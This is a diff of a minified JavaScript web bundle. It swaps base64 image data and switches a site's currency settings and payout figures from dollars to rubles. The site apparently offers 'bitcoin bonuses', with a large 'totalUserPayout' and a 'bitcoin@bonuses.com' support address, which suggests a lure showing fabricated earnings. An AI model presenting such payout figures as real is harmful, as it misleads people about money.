pUMVOIv0Wg0K3x+j480WcBCb5zh+9AOnMNcG4X0mWdmQ4PN2MyEEr/fTwzPWjcEwbuVCrZS7ZgDn5GxCMPUHCevrTV+z4rEEBSh4AmtKiHcrnLieGJrhWWfqfulsmSwQl6BQ1vqfY20FIZAeLD0NeYSWkRyE3w+n38Z4SZ00In/ABcpK7sd13bC0RLPPJ/Po8EPp5l7SdJaeI6UMsFVePzALcYP8+uSxVu0pDjyPFiFwM34/8KmG6QKIzy0tuAX4mbLCE3zxSNqpZLVxBHWLJgjIvNNI8PS/c7xhLCf06ZOLcDNz1aJ3KpITZIsvNZCiO83bf8Onc5s1i1fVEkuiolMsniuxmS7A7LZ0JtZFQpazSAd0oGCONcv1R6XNO5W4C6JHNLB+LQ2pfSPEblCS6SQOtwaDL0jOd3umLOLfud0KFh3mhgmsr2Z4LCWi+DUpqak8QM/m9l30eX3hanZFlKZE/3DFtNGhgfuflhoppC2HMHdIzmIDubk83kLIcQJXncbMrlNFQrpSA6rUvTUlhBVw+B85hZaKV1IFXpHWaMiwR0yESTjInIsyozBIFjFukSqMgaW3diC11vZF5GDpf/tJuj7zTQ6FluV8uKkuAiwglvOt1zJqKrEVyXzYzM5mgcfnJfSlXXkKfngyaP1d8DP5fsnlHZIc/viVHU+2ghGTpu6AdVDh65Ici0r41zjAhmhMy2SXEecm6CwqwluXUuW9irsjSRYKu3nlT2xhqvtjaTFqpbs4pKvUDQCOCee/c93SHKHxHaL7XaFQk3sqns6rkqoY3OMK69W2MmI9vt5LbN+nCJaqu321cRJQVt3PaPqyKTafQGAiV1kNqPNJK44ORfb7fZGdXV+Qf6ccuhoMZcB47nBKXeSC4BUNMKPfTFMVyYDyMySpaocEBAeyX4clxabmO5sV12uVqvLq+WyDCCPMWkptQyfEhJuZlZHy4kcx5PU/D7Zfj83UQsoF/3li5V/c5xVztpbXDxx78zZQ2X/Tr8AiYfyWvZBPlkAAAAASUVORK5CYII="
+        t.exports = "data:image/png;base64,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"
     },
     "8f3d": function(t, e, s) {
         t.exports = s.p + "img/reviews.7132bad7.jpg"
@@ -5804,7 +5912,7 @@
         s("3834")
     },
     b518: function(t, e) {
-        t.exports = "data:image/png;base64,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"
+        t.exports = "data:image/png;base64,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"
     },
     b6a0: function(t, e, s) {
         "use strict";
@@ -5838,7 +5946,7 @@
                     notApprove: 0
                 },
                 reactions: new Array,
-                totalUserPayout: 13930399, // 1030841562 / 74 ≈ 13930399 (rounded)
+                totalUserPayout: 1030841562,
                 address: "18641 Shenandoah Dr, Oregon City, OR, 97045",
                 commentLikes: {
                     page: new Array,
@@ -5864,7 +5972,7 @@
                 currency: {
                     usd: 74,
                     eur: 87,
-                    btc: 990.15 // 73270.8 / 74
+                    btc: 73270.8
                 },
                 isCollectingBTC: !1,
                 isCollectedBTC: !1,
@@ -5905,27 +6013,27 @@
                     curRate: 1,
                     usdCurRate: 150,
                     city: "Moscow",
-                    pre: ["USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD"]
+                    pre: ["RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB"]
                 },
                 supportmail: "bitcoin@bonuses.com",
                 countryStore: {
                     countryName: "Russia",
-                    currencyUSER: "USD",
+                    currencyUSER: "RUB",
                     curRate: 1,
                     owc: {
                         im: {
-                            short: "usd",
-                            one: "dollar",
-                            mult: "dollars"
+                            short: "RUB",
+                            one: "ruble",
+                            mult: "rubles"
                         },
                         vin: {
-                            one: "dollar"
+                            one: "ruble"
                         },
                         predl: {
-                            mult: "dollars"
+                            mult: "rubles"
                         },
                         rod: {
-                            mult: "dollars"
+                            mult: "rubles"
                         }
                     }
                 },
@@ -6149,18 +6257,18 @@
         s("d63c")
     },
     dc66: function(t, e) {
-        t.exports = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAA7VBMVEUAAADupwDupgDwrAb/tADwqQPtpgDupgDuqALupgDtpwDupgDtpgDvpgDoqADtpgDupwDtpgDtpgDupgDvpgDupgDtpgDupgDtpwDspgDtpwDtpgDspADtpwDupgDupgDupwDupwDupgDtpwDvpQDtpgDrpwD/yijtpgD/yCT/swD/vA7/vhL/twb/wRj/xiD/ugv/wBX/tQP/xB3/uAn/xyP/whrxrAbvqADyrwnxqgL3rQD9xSH8sQDzsgz6vxr5rwHyqgH7wR34uhX3uBL1tRD4vBj+sgH7tgr0qwDyrQX0rgX7uxP2swv9vxcfzM+dAAAAJ3RSTlMA/fv8A/y4sv139MC8LgqqzqNvWhLuyY1HNBvaJsVn6t2ZhGQ8gU5dU2ypAAAD9klEQVRYw82V2XqiQBBGAUWjE/ddsyczlrgblU0WEXed93+c6QZCCkYnn+Zmzk2Mn+fv7qqiYf5z0vXU26/CQz6ReKk8x2LxXOw2m30qV+6+8OrVfCVz33jkIIQUkWVdl1mucF6+y8dKAMDy8/lWVVXT1DRVAlD2m8N00nSZyVztzJYfGgD8VtXWwoggUNZzkNTRoNPrt5oftG7iJ+xoqpIkv12PgmxBFYRue/hOfJ8lFw3ZqecGByCZzspdxAi2gjAat3v9JmIBxaD/Aux2DmB+yGMP8pFuQKAB/9pBAuZrwQTQfHngQD8poJEjDDqkhGdrUOfmZBUNJGp7brvddj9sJJir6+7meJRlURQVkSCx1dAG1gI5POxcvY2gMaYEDsp854wBCYJkICHDCvTwkjn27I4P+We8A7IHbdwe9t4nXiFmES6FAmIS9cfKZoDs4dD9OwBQ17QIRMdVuMcBCvXHe88eYjqiV0SnDbiRdziA+KRc1Kd6D9GhbaSDRLqAmQF6Hm4V6rs6tacEUZKPh96099sP6DcxE3jAAY7v6++Uqa0A6AeSpJEWuSVAGFDFAUSnvq/3Ke82AOwOkltE8jSgKsz4RjQYQJd3dM+eEPoGnYClDCBtVXOzOfw2DMsyVjb5qpRicIDnE92TWw4TiybYOoRhWYinAwHUnzo+kREGUOamsNY2m429WBnWbOa2Mcf4/FBcny5PdNzvFl3ddB7oUBmXkPoMEDvU95ZvhvoNKvG77c40OEkttoICPN/XEQpodAPu+phIDAX0esgPorsB7S8CkB9iQe804e8jzNgXFEDqj32MBfS6GnXDRdS5z6fpfjdFfjjA7aPWpX2gP6OrWysZEgzaAT0A8jEGeEjkRtrvdqIiAeHxgfkkd+Mkn2ZFVFXTzP1+vxNdFOASUQZRgAXyQ8iwXdMi4hulJbM1HBAts4uzAaAI6EY6c68Xy8AvrZP+7ONCCY7BMhl6LxYySYic2oYFWy8gdCWmmRDp1yzc2H9FtAC/mfAOTlCLn4gwJHqIcfAMLR7VIBTBr8JVEEHamuQQaJZ1eGPOUMuCHtrEkotzAKy4Px7txWJh20sej2GYaJ7jrWBAiUlXf2ayj0lwSJZuq8y/SDVYAwfYbNSvdLGYZr6meM9agWFOMReSzrIzPEt55lLqpQjawk2GuZgCoG7qJeZyYjctVIS7ywPeYHVFETBlVIVI/IqABMzQoxO9PCAFBroXa5cHRDkbFeGVuZwnHU1C5ZoqyqiKmSsCfsjfbEMM9ZHPXRGQiXxzknIR9CKtfytgBT+ZK3jmff9H9JqAhDuKlgy3ReYa6k/AyzoPycRl6+P3Xa6czbwWmf+bP1aebIZqTzhWAAAAAElFTkSuQmCC"
+        t.exports = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAA7VBMVEUAAADupwDupgDwrAb/tADwqQPtpgDupgDuqALupgDtpwDupgDtpgDupwDtpgDtpgDupgDvpgDupgDtpgDupgDtpwDspgDtpwDtpgDspADtpwDupgDupgDupwDupwDupgDtpwDvpQDtpgDrpwD/yijtpgD/yCT/swD/vA7/vhL/twb/wRj/xiD/ugv/wBX/tQP/xB3/uAn/xyP/whrxrAbvqADyrwnxqgL3rQD9xSH8sQDzsgz6vxr5rwHyqgH7wR34uhX3uBL1tRD4vBj+sgH7tgr0qwDyrQX0rgX7uxP2swv9vxcfzM+dAAAAJ3RSTlMA/fv8A/y4sv139MC8LgqqzqNvWhLuyY1HNBvaJsVn6t2ZhGQ8gU5dU2ypAAAD9klEQVRYw82V2XqiQBBGAUWjE/ddsyczlrgblU0WEXed93+c6QZCCkYnn+Zmzk2Mn+fv7qqiYf5z0vXU26/CQz6ReKk8x2LxXOw2m30qV+6+8OrVfCVz33jkIIQUkWVdl1mucF6+y8dKAMDy8/lWVVXT1DRVAlD2m8N00nSZyVztzJYfGgD8VtXWwoggUNZzkNTRoNPrt5oftG7iJ+xoqpIkv12PgmxBFYRue/hOfJ8lFw3ZqecGByCZzspdxAi2gjAat3v9JmIBxaD/Aux2DmB+yGMP8pFuQKAB/9pBAuZrwQTQfHngQD8poJEjDDqkhGdrUOfmZBUNJGp7brvddj9sJJir6+7meJRlURQVkSCx1dAG1gI5POxcvY2gMaYEDsp854wBCYJkICHDCvTwkjn27I4P+We8A7IHbdwe9t4nXiFmES6FAmIS9cfKZoDs4dD9OwBQ17QIRMdVuMcBCvXHe88eYjqiV0SnDbiRdziA+KRc1Kd6D9GhbaSDRLqAmQF6Hm4V6rs6tacEUZKPh96099sP6DcxE3jAAY7v6++Uqa0A6AeSpJEWuSVAGFDFAUSnvq/3Ke82AOwOkltE8jSgKsz4Rj